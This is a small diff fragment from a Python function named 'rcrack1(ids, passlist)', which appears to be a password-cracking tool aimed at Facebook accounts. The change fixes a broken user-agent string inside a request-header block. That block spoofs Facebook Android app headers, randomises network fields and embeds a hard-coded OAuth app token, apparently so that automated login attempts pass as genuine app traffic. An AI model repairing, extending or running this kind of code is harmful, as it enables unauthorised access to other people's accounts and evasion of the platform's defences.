@@ -807,7 +807,7 @@ def rcrack1(ids,passlist):
 			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-type':'unknown',
 			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36;
+			'user-agent':'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36',
 			'x-fb-net-hni':str(random.randint(2e4,4e4)),
 			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
 			'x-fb-connection-quality':'EXCELLENT',
